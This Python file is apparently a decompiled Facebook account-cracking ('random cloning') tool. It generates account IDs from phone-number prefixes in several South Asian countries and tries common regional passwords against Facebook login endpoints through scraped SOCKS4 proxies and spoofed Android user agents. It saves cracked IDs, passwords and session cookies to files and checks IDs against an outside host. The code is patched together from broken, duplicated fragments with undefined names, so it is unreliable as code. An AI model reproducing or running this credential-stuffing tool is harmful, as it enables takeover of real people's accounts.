# GITHUB LINK : SKBER-CYBER
# DECODE BY : MUHAMMAD JAKARIYA HASAN
import requests
import os
import sys
import random
import datetime
from concurrent.futures import ThreadPoolExecutor

def clear():
    os.system('clear')  # Clear the console
    print(logo)  # Print the logo

def fetch_proxies():
    url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    if response.status_code == 200:
        with open('Proksi.txt', 'w') as file:
            file.write(response.text)
    else:
        print("Failed to fetch proxies")

def main():
    clear()  # Clear the console and print logo
    fetch_proxies()  # Fetch and save proxies

if __name__ == "__main__":
    logo = "\n".join([
        "\x1b[1;32mWelcome to Proxy Scraper\x1b[0m",
        "\x1b[1;34mFetching proxies...\x1b[0m"
    ])
    
def linex():
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def SIAM():
    os.system('clear')
    print(' BANGLADESH RANDOM CLONING ')
    print(' INDIA RANDOM CLONING  ')
    print(' PAKISTAN RANDOM CLONING  ')
    print(' NEPAL RANDOM CLONING  ')
    print(' AFGHANISTAN RANDOM CLONING  ')
    print(' MALAYSIA RANDOM CLONING  ')
    print(' EXIT TOOLS ')
    linex()    
    option = input(' SELECTION : ')    
    if option in ('1', '2', '3', '4', '5', '6'):
        os.system('xdg-open https://t.me/vixfbclone')
        # Assuming poco is a predefined object with an append method
        poco.append(option)
        SIAM()  # Call the function again for the menu
    elif option == '0':
        exit()
    else:
        linex()
        print(' OPTION NOT FOUND ')
        time.sleep(1)
        print(' TRY AGAIN ')
        time.sleep(1)
        SIAM()  # Call the function again for the menu

import random
import string

def randomxmenu():
    print("ENTER SIM CODE")
    sim_codes = [
        ' EXAMPLE ', ' 013 ', ' 016 ', ' 017 ', ' 018 ', ' 019 ',
        ' +91639 ', ' +91600 ', ' +91620 ', ' 0306 ', ' 0315 ',
        ' 0335 ', ' 0345 ', ' 9814 ', ' 9815 ', ' 9861 ', ' 9840 ',
        ' +9340 ', ' +9360 ', ' +9330 ', ' +9350 ', ' 0113 ',
        ' 0116 ', ' 0112 ', ' 0119 ', ' 6969 ', ' 5555 ',
        ' 7777 ', ' 99999 '
    ]
    
    print("Available SIM Codes:")
    for code in sim_codes:
        print(code.strip())
    
    limit = input("ENTER CRACK LIMIT: ")
    method = input("ENTER METHOD (M1 or M2): ")
    
    if method not in ['M1', 'M2']:
        print("Invalid method selected.")
        return
    
    print(f"Method selected: {method}")
    print(f"Crack limit set to: {limit}")

def generate_random_code(length=4):
    characters = string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Example usage
if __name__ == "__main__":
    randomxmenu()
    print("Generated random code:", generate_random_code())

import random
import string

def random_digit_generator(n):
    """Generate a generator that yields n random digits."""
    for _ in range(n):
        yield random.choice(string.digits)

# Example usage
if __name__ == "__main__":
    n = 10  # Number of random digits to generate
    for digit in random_digit_generator(n):
        print(digit)
import random
import string

def random_digit_generator(n):
    """
    A generator function that yields 'n' random digits.
    
    Parameters:
    n (int): The number of random digits to generate.
    
    Yields:
    str: A random digit as a string.
    """
    for _ in range(n):
        yield random.choice(string.digits)

# Example usage:
if __name__ == "__main__":
    n = 10  # Specify the number of random digits you want
    for digit in random_digit_generator(n):
        print(digit)
import random
import string

def generate_random_digits(count):
    """
    Generator function that yields `count` random digits as strings.
    
    Args:
        count (int): Number of random digit characters to yield.

    Yields:
        str: A single random digit character.
    """
    for _ in range(count):
        yield random.choice(string.digits)

# Example usage:
if __name__ == "__main__":
    num_digits = 10  # You can set any number here
    for digit in generate_random_digits(num_digits):
        print(digit, end=' ')
def main():
    clear_screen()
    
    # Display example codes
    example_codes = [
        '1: EXAMPLE : R: 013 | G: 016 | G: 017 | G: 018 | G: 019',
        '2: EXAMPLE : R: +91639 | G: +91600 | G: +91620',
        '3: EXAMPLE : R: 0306 | G: 0315 | G: 0335 | G: 0345',
        '4: EXAMPLE : R: 9814 | G: 9815 | G: 9861 | G: 9840',
        '5: EXAMPLE : R: +9340 | G: +9360 | G: +9330 | G: +9350',
        '6: EXAMPLE : R: 0113 | G: 0116 | G: 0112 | G: 0119'
    ]
    
    for code in example_codes:
        print(code)
        print_line()

    # Input for SIM code
    code = input_with_prompt('ENTER SIM CODE: ')
    
    # Input for crack limit
    limit = int(input_with_prompt('ENTER CRACK LIMIT: '))
    
    clear_screen()
    
    print(f'METHOD M1 | HOST')
    print(f'METHOD M2 | GRAPH')
    print_line()
    
    method = input_with_prompt('ENTER METHOD: ')
    
    for i in range(limit):
        # Implement the logic for the chosen method here
        pass

def clear_screen():
    # Function to clear the console screen
    import os
    os.system('cls' if os.name == 'nt' else 'clear')

def print_line():
    print('-' * 40)

def input_with_prompt(prompt):
    return input(prompt)

# The given code seems to follow a certain pattern of data processing, checking various conditions, and performing actions based on those conditions.

def process_data():
    poco = "sample_poco_value"
    user = []  # List to store user values
    
    # Assuming nmbr is already defined elsewhere in the program
    for nmbr in range(6):  # Loop to iterate over nmbr values
        if '1' in poco:
            gang = [i for i in range(8)]
            user.append(gang)
        
        if '2' in poco:
            gang = [i for i in range(6)]
            user.append(gang)
        
        if '3' in poco:
            gang = [i for i in range(7)]
            user.append(gang)
        
        if '4' in poco:
            gang = [i for i in range(6)]
            user.append(gang)
        
        if '5' in poco:
            gang = [i for i in range(7)]
            user.append(gang)
        
        if '6' in poco:
            gang = [i for i in range(7)]
            user.append(gang)
        
    # Assuming ThreadPool and other required methods are defined elsewhere in the code.
    thread_pool = ThreadPool(max_workers=60)
    poco.clear()
    tl = len(user)

    print(f"{xd} CODE | {R}UID {T}: {code} {R}| {G}{tl} ")

    if len(user) == 0:
        print(f"{xd} IF NO RESULT ON {R}| {G}OFF AIRPLANE MODE")

    print(f"{xd} YOUR CLONING STARTED........ {R}π")
    print(f"{xd} USE VPN {R}: {T}1.1.1.1")
    
    for love in user:
        ids = code + love
        if '1' in poco:
            pasx = ids[None:6] + ['57273200', '57575751', '59039200']
        if '2' in poco:
            pasx = ids[None:6] + ['khankhan', 'khan1122', 'ali12345', 'khanbaba', 'pakistan']
        if '3' in poco:
            pasx = ids[None:6] + ['khankhan12345', 'khan', 'baloch', 'pubg']
        # Process pasx further as needed.

# Interpreted from bytecode-like logic
# Reconstructed into high-level Python code

def main(ids, love, poco, ___method___, ____poco____, tl):
    # Define possible passwords
    pasx = []

    if '5' in poco:
        pasx = [
            'nepal12', 'nepal123', 'nepal1234', 'nepal12345',
            'maya123', 'kathmandu', 'pokhara', 'tamang',
            'maya1234', 'tamang123', 'tamang12345',
            'nepal@123', 'kathmandu123'
        ]
    
    if '6' in poco:
        pasx = [
            love[:1],
            ids[:7],
            ids[:6],
            ids[:8],
            ids
        ]

    if '1' in ___method__:
        for pwd in pasx:
            ____poco____.submit(___methodA____, ids, pwd, tl)

    elif '2' in ___method__:
        for pwd in pasx:
            ____poco____.submit(___methodB____, ids, pwd, tl)

    print('\x1b[1;37m')  # ANSI escape for white bold text
    linex()
    print(f"{xd} THE PROCESS HAS COMPLETED")
    print(f"{xd} TOTAL OK{R}|{G}CP {R}:{G} ", end='')

    total_ok = len(ok)
    total_cp = len(cp)
    print(f"{total_ok}{R}|{G}{total_cp}")

    linex()
    exit()

# Required external variables or functions assumed to be defined elsewhere:
# - ___methodA____, ___methodB____
# - xd, R, G
# - linex(), ok, cp
import random

def generate_user_agent():
    versions = [
        '14', '15', '10', '13', '7.0.0', '7.1.1', '9', '12', '11',
        '9.0', '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1',
        '6.0.1', '9.0.1'
    ]
    
    models = [
        'SM-T835', 'SM-S901U', 'SM-S134DL', 'SM-J250F', 'SM-A217F',
        'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M',
        'SM-J410G', 'SM-A205GN', 'SM-A205GN', 'SM-A505GN', 'SM-G930F',
        'SM-J210F', 'SM-N9005', 'SM-J210F'
    ]
    
    builds = [
        'MMB29Q', 'R16NW', 'LRX22C', 'R16NW', 'KTU84P', 'JLS36C',
        'NJH47F', 'PPR1.180610.011', 'QP1A.190711.020', 'NRD90M',
        'RP1A.200720.012', 'M1AJB', 'MMB29T'
    ]

    version = random.choice(versions)
    model = random.choice(models)
    build = random.choice(builds)
    ver = str(random.choice(range(77, 577)))
    ver2 = str(random.choice(range(57, 77)))

    user_agent = (
        f"Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
        f"Chrome/{ver2}.0.{ver}.8 Mobile Safari/537.36"
    )

    return user_agent

import requests
import sys
import random
import re
import time

def methodA(requests, Session, sys, stdout, write, G, loop, ok, cp, flush, open, read, splitlines, random, choice, get, text, re, search, str, group, format, time, split, len, ____PO_CO____, post, cookies, get_dict, print, xd, R, Y, join, items, findall, W, exceptions, ConnectionError, sleep):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://touch.facebook.com',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    url = 'https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100'
    
    cookies = {
        'c_user': 'user_id_value',  # Replace 'user_id_value' with actual user ID
    }
    
    data = {
        'm_ts': 'timestamp_value',
        'li': 'li_value',
        'jazoest': 'jazoest_value',
        'lsd': 'lsd_value',
        'dpr': '2',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'x-fb-lsd': 'x_fblsd_value',
        'x-requested-with': 'XMLHttpRequest',
        'viewport-width': '360',
        'accept': '*/*',
    }

    try:
        response = requests.post(url, headers=headers, data=data, cookies=cookies)
        if response.status_code == 200:
            print("Request was successful!")
            print(response.text)
        else:
            print("Request failed with status code:", response.status_code)
    except ConnectionError as e:
        print("Connection error:", e)
    except Exception as e:
        print("An error occurred:", e)
import requests
import random
import re
import sys
import time

# User-Agent string
ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'

# Initialize session
ewe = requests.Session()

# Print initial message
sys.stdout.write('\r\r< [SIAM] > < [M-1] > ')
sys.stdout.flush()

# Load passwords from file
with open('Proksi.txt', 'r') as file:
    xx = file.read().splitlines()

# Select a random proxy
proxy = random.choice(xx)
proxies = {
    'http': proxy,
    'socks4://': proxy
}

# Prepare request data
data = {
    'm_ts': '',
    'li': '',
    'try_number': 0,
    'unrecognized_tries': 0,
    'email': '',
    'prefill_contact_point': '',
    'prefill_source': 'browser_dropdown',
    'prefill_type': 'contact_point',
    'first_prefill_source': 'browser_dropdown',
    'first_prefill_type': 'contact_point',
    'had_cp_prefilled': True,
    'had_password_prefilled': False,
    'is_smart_lock': False,
    'bi_xrwh': 0,
    'encpass': '#PWD_BROWSER:0:{}:{}'
}

# Make the request
response = ewe.post(
    'https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
    data=data,
    headers={
        'User-Agent': ua,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'Origin': 'https://touch.facebook.com',
        'Referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
        'X-Requested-With': 'XMLHttpRequest'
    },
    proxies=proxies
)

# Check for checkpoint in cookies
if 'checkpoint' in ewe.cookies.get_dict():
    uid = ewe.cookies.get_dict()['checkpoint'].split(';')[0].split('%')[0]
    sys.stdout.write(f'\r- [SIAM-CP] {uid} | ')
    sys.stdout.flush()

    # Save to file
    with open('/sdcard/SIAM-M1-RANDOM-CP.txt', 'a') as file:
        file.write(f'{uid}|{pw}\n')

    # Increment counter
    cp += 1
import requests
import re
import time

def methodB(key, value, pw):
    kuki = []
    for k, v in zip(key, value):
        kuki.append(f"{k}={v}")
    
    kuki_str = ''.join(kuki)
    uid = re.findall(r'c_user=(.*);xs', kuki_str)[0]
    
    response = requests.get(f'https://mrpoco143.pythonanywhere.com/live?uid={uid}').text
    
    if 'LIVE' in response:
        print(f'\r- [SIAM-OK] {uid} | {pw} ')
        print(f'\r[💥 {kuki_str} ] ')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        
        with open('/sdcard/SIAM-M1-RANDOM-OK.txt', 'a') as f:
            f.write(f'{uid}|{pw}|{kuki_str}\n')
        
        global ok
        ok += 1
    
    time.sleep(15)

# Initialize global variables
ok = 0
loop = 0        
import random
import string
import uuid
import requests

# Initialize variables
ids = ["user1", "user2", "user3"]  # Example user IDs
pw = "password123"
session_cookies = {}
url = "https://mrpoco143.pythonanywhere.com/live?uid="

# Function to generate a random access token
def generate_access_token():
    return f"350685531728|{random.choice(string.hexdigits)}{random.choice(string.hexdigits)}"

# Function to generate a random user agent
def generate_user_agent():
    return f"FBAN/FB4A;FBAV/{random.randint(11, 99)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)}"

# Function to generate cookies
def generate_cookies():
    return f"{random.choice(string.ascii_letters)}{random.randint(1000, 9999)}"

# Function to generate session details
def generate_session_details():
    return {
        "adid": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "format": "json",
        "device_id": str(uuid.uuid4()),
        "cpl": "true",
        "family_device_id": str(uuid.uuid4()),
        "credentials_type": "device_based_login_password",
        "error_detail_type": "button_with_disabled",
        "source": "device_based_login",
        "email": random.choice(ids),
        "password": pw,
        "access_token": generate_access_token(),
        "generate_session_cookies": "1",
        "meta_inf_fbmeta": "",
        "advertiser_id": str(uuid.uuid4()),
        "currently_logged_in_userid": "0",
        "locale": "en_US",
        "client_country_code": "US",
        "auth.login": "authenticate",
        "method": "fb_api_req_friendly_name",
        "fb_api_caller_class": "api_key"
    }

# Function to send the post request
def send_post_request():
    session_data = generate_session_details()
    headers = {
        "User-Agent": generate_user_agent(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "graph.facebook.com",
        "X-FB-Net-HNI": "45204",
        "X-FB-SIM-HNI": "45201",
        "X-FB-Connection-Type": "MOBILE.LTE",
        "X-Tigon-Is-Retry": "False",
        "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
        "X-FB-Friendly-Name": "ViewerReactionsMutation",
        "X-FB-Request-Analytics-Tags": "graphservice",
        "X-FB-HTTP-Engine": "Liger",
        "X-FB-Client-IP": "True",
        "X-FB-Server-Cluster": "True",
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
        "Content-Length": "698"
    }
    
    response = requests.post(url, data=session_data, headers=headers)
    return response.json()

# Function to handle the response and process session cookies
def handle_response(response):
    if 'session_key' in response:
        uid = response['uid']
        cookies = response.get('session_cookies', [])
        if cookies:
            for coki in cookies:
                cookie = generate_cookies()
                with open('/sdcard/SIAM-M2-RANDOM-OK.txt', 'a') as file:
                    file.write(f"{uid}|{pw}|{cookie}\n")
                print(f"UID: {uid} | Password: {pw} | Cookie: {cookie}")
        else:
            print("No session cookies found")
    else:
        print("Error: Unable to retrieve session key")

# Main loop
def main_loop():
    while True:
        response = send_post_request()
        handle_response(response)

# Run the main loop
import requests
import bs4
import json
import uuid
import os
import sys
import random
import datetime
import time
import re
import urllib3
import base64
import string
import platform
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Define necessary constants and variables
G = '\x1b[1;32m'
W = '\x1b[1;97m'
R = '\x1b[38;5;160m'
B = '\x1b[1;90m'
Y = '\x1b[1;33m'
T = '\x1b[1;34m'
E = '\x1b[38;5;205m'
O = '\x1b[38;5;81m'

# Proxy fetch URL
proxy_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all'

# Function to fetch proxies from ProxyScrape API
def fetch_proxies():
    try:
        response = requests.get(proxy_url)
        return response.text
    except Exception as e:
        print(f"Error fetching proxies: {e}")
        return None

# Function to save proxies to a file
def save_proxies(proxies):
    try:
        with open('Proksi.txt', 'w') as file:
            file.write(proxies)
    except Exception as e:
        print(f"Error saving proxies: {e}")

# Colorful printing functions
def print_logo():
    logo = f"{G}[{T}Π{G}] {G}[{R}1{G}] {G}[{R}2{G}] {G}[{R}3{G}] {G}[{R}4{G}] {G}[{R}5{G}] {G}[{R}6{G}] {G}[{R}0{G}] {G}[{R}?{G}]"
    print(logo)

# Main function to run the program
def main():
    try:
        print_logo()
        proxies = fetch_proxies()
        if proxies:
            save_proxies(proxies)
            print(f"{Y}Proxies saved successfully to Proksi.txt{W}")
        else:
            print(f"{R}Failed to fetch proxies.{W}")
    except Exception as e:
        print(f"Error in main execution: {e}")

if __name__ == '__main__':
    main()